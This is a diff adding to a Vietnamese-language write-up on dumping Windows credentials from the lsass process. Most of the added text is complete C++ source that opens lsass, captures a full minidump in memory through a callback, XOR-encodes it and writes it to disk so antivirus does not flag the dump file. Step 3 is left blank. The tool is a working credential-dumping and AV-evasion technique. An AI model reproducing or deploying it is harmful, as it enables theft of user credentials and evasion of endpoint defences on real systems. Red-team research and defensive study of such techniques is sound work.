@@ -28,6 +28,144 @@ Dump Credential của người dùng trên máy, thường sẽ dump từ lsass.
 - Cần trả lời câu hỏi: Trong trường hợp file dmp bị mã hóa trước khi rơi xuống ổ đĩa thì sao?
 
 # Step to reproduce 
+Bước 1: Quan sát hành động của AV khi dump data 
+Sau khi tiến hành dump data bằng nhiều cách khác nhau, tôi nhận thấy, file dmp được dump thường bị bắt, chứ không phải do hành động can thiệp vào tiến trình dump
+<img width="973" height="655" alt="image" src="https://github.com/user-attachments/assets/1f38637f-9e88-452e-a8dd-0c9f1cf04ed0" />
 
+Bước 2: 
+Viết tools từ windows API thử nghiệm giả thuyết, là mã hóa dữ liệu trước khi lưu vào ổ đĩa 
+
+'''C/C++ 
+#include <windows.h>
+#include <DbgHelp.h>
+#include <iostream>
+#include <TlHelp32.h>
+#include <processsnapshot.h>
+#pragma comment (lib, "Dbghelp.lib")
+#pragma comment (lib, "Advapi32.lib")
+
+using namespace std;
+
+
+LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
+DWORD bytesRead = 0;
+
+void dbgLastError(const char* ctx) {
+	DWORD e = GetLastError();
+	printf("[-] ERROR at %s: GetLastError=%lu (0x%lx)\n", ctx, e, e);
+}
+
+BOOL CALLBACK minidumpCallback(
+	__in     PVOID callbackParam,
+	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
+	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
+)
+{
+	LPVOID destination = 0, source = 0;
+	DWORD bufferSize = 0;
+
+	switch (callbackInput->CallbackType)
+	{
+		case IoStartCallback:
+			callbackOutput->Status = S_FALSE;
+			break;
+		case IoWriteAllCallback:
+			callbackOutput->Status = S_OK;
+			
+
+			source = callbackInput->Io.Buffer;
+			
+			destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);
+			
+			bufferSize = callbackInput->Io.BufferBytes;
+			bytesRead += bufferSize;
+			
+			RtlCopyMemory(destination, source, bufferSize);
+			
+			printf("[+] Minidump offset: 0x%llx; length: 0x%x\n", (unsigned long long)callbackInput->Io.Offset, bufferSize);
+			break;
+
+		case IoFinishCallback:
+			callbackOutput->Status = S_OK;
+			break;
+
+		default:
+			return true;
+	}
+	return TRUE;
+}
+
+int main(int argc, char* argv[]) {
+	DWORD PID = 0;
+	DWORD bytesWritten = 0;
+	HANDLE processHandle = NULL;
+	PROCESSENTRY32 processEntry = {};
+	processEntry.dwSize = sizeof(PROCESSENTRY32);
+
+	if (argc < 2) {
+		fprintf(stderr, "Usage: %s <lsass PID>\n", argv[0]);
+		return 1;
+	}
+
+	PID = (DWORD)strtoul(argv[1], NULL, 10);
+	printf("[*] Target PID = %lu (0x%lx)\n", PID, PID);
+
+
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, PID);
+	if (processHandle == NULL) {
+		dbgLastError("OpenProcess");
+		printf("[-] OpenProcess failed. Co the do thieu SeDebugPrivilege hoac PPL.\n");
+		return 1;
+	}
+	printf("[+] OpenProcess OK, handle=0x%p\n", processHandle);
+	
+
+	MINIDUMP_CALLBACK_INFORMATION callbackInfo;
+	ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
+	callbackInfo.CallbackRoutine = &minidumpCallback;
+	callbackInfo.CallbackParam = NULL;
+
+	printf("[*] Starting MiniDumpWriteDump...\n");
+	BOOL isDumped = MiniDumpWriteDump(processHandle, PID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
+	printf("[*] MiniDumpWriteDump returned: %s (bytesRead=%u)\n", isDumped ? "TRUE" : "FALSE", bytesRead);
+
+	if (!isDumped) {
+		dbgLastError("MiniDumpWriteDump");
+	}
+
+	if (isDumped) 
+	{
+		const BYTE xorKey = 0x5A; 
+		BYTE* pBuf = (BYTE*)dumpBuffer;
+		for (DWORD i = 0; i < bytesRead; i++) {
+			pBuf[i] ^= xorKey;
+		}
+		printf("[+] XOR encoding done (key=0x%02x, %u bytes)\n", xorKey, bytesRead);
+
+		HANDLE outFile = CreateFile(L"process.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (outFile == INVALID_HANDLE_VALUE) {
+			dbgLastError("CreateFile");
+			printf("[-] CreateFile failed.");
+			return 1;
+		}
+		printf("[+] CreateFile OK, handle=0x%p\n", outFile);
+
+		if (WriteFile(outFile, dumpBuffer, bytesRead, &bytesWritten, NULL))
+		{
+			printf("\n[+] process dumped from 0x%p to process.dmp (%u bytes)\n", dumpBuffer, bytesWritten);
+		}
+		else {
+			dbgLastError("WriteFile");
+		}
+		CloseHandle(outFile);
+	}
+
+	printf("[*] Done. Cleaning up.\n");
+	CloseHandle(processHandle);
+	return 0;
+}
+'''
+
+Bước 3: 
 
 # Reference
